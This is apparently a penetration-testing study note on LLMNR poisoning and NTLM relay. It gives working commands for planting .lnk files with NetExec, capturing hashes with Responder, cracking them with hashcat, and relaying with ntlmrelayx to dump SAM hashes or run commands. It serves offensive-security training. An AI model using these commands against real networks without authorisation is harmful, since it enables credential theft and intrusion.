---
title: "LLMNR Poisoning and NTLM Relay"
slug: llmnr-poisoning-and-ntlm-relay
category: notes
handbook: oscp
tags: ["active-directory", "networking"]
draft: false
pubDatetime: 2026-08-01T10:35:17+03:00
modDatetime: 2026-09-08T22:35:52+03:00
description: "When a Windows host cannot resolve a name over DNS, it falls back to broadcast name resolution (LLMNR, NBT-NS, mDNS) and asks the whole local segment \"who is X?\"."
---
When a Windows host cannot resolve a name over DNS, it falls back to broadcast name resolution (LLMNR, NBT-NS, mDNS) and asks the whole local segment "who is X?". Any host can answer. Poisoning that reply makes the victim authenticate to the attacker, handing over a NetNTLMv2 challenge-response that is either cracked offline or relayed onward.

Both need a position on the same broadcast segment as the victim. On a routed path (a Tailscale-reached lab, a target across a router) the broadcast traffic never arrives, so these only work from a foothold inside the segment, reached by pivoting first ([Tunneling and Pivoting](/collections/oscp/tunneling-and-pivoting)).

**Not applicable on the OSCP exam.** Two reasons it does not come up: the exam AD set is reached over a routed link with no shared broadcast segment, so there is no poisoning position to begin with, and OffSec's exam guide restricts spoofing, which is what LLMNR/NBT-NS/mDNS poisoning is (worth confirming against the current rules before relying on it anywhere near the exam). This is PEN-200 lab and real-engagement material, kept here for that. The credential attacks the exam actually uses are in [Active Directory](/collections/oscp/active-directory).

## Hash capture without a LAN position: planted .lnk

A writable SMB share can replace the broadcast segment entirely. An `.lnk` shortcut can point its icon at an SMB path on the attacker host; any user who merely opens the folder in Explorer (no clicking, just rendering the file listing) makes their machine resolve the icon path and authenticate to the attacker with their NetNTLMv2 hash. Because the connection is victim-initiated over SMB, it crosses routed links fine: from Kali at the VPN this works, where LLMNR poisoning does not.

The path: find a share the compromised user can write to ([SMB Enumeration](/collections/oscp/smb-enumeration), `nxc smb <target> -u user -p pass --shares`), plant the .lnk, and listen:

```bash
nxc smb TARGET -u user -p 'pass' -M slinky -o SERVER=KALI NAME=README
sudo responder -I tun0      # or ntlmrelayx, if relaying straight away
```

The slinky module (`NAME` becomes `NAME.lnk`, in a spot where users actually browse the folder) writes the shortcut into every writable share it finds. Hashes land in Responder's logs as usual, crack with `hashcat -m 5600`. The hash that arrives belongs to whoever browsed the share, not to the account that planted the file, so a low-value credential can capture an admin's. Vary `NAME` and drop several on a shared team share: an early alphabetical name renders sooner.

Clean up by deleting the planted .lnk afterwards; leaving it keeps harvesting the same hash forever.

## Capture with Responder

Responder answers poisoned LLMNR/NBT-NS/mDNS queries and runs rogue SMB/HTTP servers to collect the authentication:

```bash
sudo responder -I eth0
```

Captured hashes print to the console and land in `/usr/share/responder/logs/`. They are NetNTLMv2, a challenge-response that cannot be passed like an NT hash, so crack it offline:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

A cracked password then re-enters the domain workflow as any other credential.

## Relay instead of crack

If the hash will not crack, relay the live authentication to a second host and act as the victim there. The target must not require SMB signing (read it from the [NetExec](/collections/oscp/netexec) banner: `signing:False`); a DC always requires signing, so DCs are never relay targets. Build the target list from a sweep instead of hand-picking from the banner:

```bash
nxc smb TARGET1-TARGET3 -u user -p 'pass' --gen-relay-list smb_targets.txt
```

`--gen-relay-list` checks signing on every host itself and writes only the relayable ones, so credentials are optional when a null session answers.

Turn Responder's own SMB and HTTP servers off first (`SMB = Off`, `HTTP = Off` in `/etc/responder/Responder.conf`) so they do not compete with the relay, then:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support               # dumps the target SAM by default
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'   # run a command
impacket-ntlmrelayx -tf targets.txt -smb2support -i            # open an interactive SMB client
```

Relaying a user who is local admin on the target gives code execution or its hashes. Relaying to LDAP on a DC can set up RBCD ([Kerberos Delegation](/collections/oscp/kerberos-delegation)) or shadow credentials.

## Where this fits

Poisoning is a common first-blood move on an internal network with no credentials, the LAN-position counterpart to the credential attacks in [Active Directory](/collections/oscp/active-directory). From Kali across a routed link it sees no broadcast traffic, so it belongs after a foothold on the internal segment.
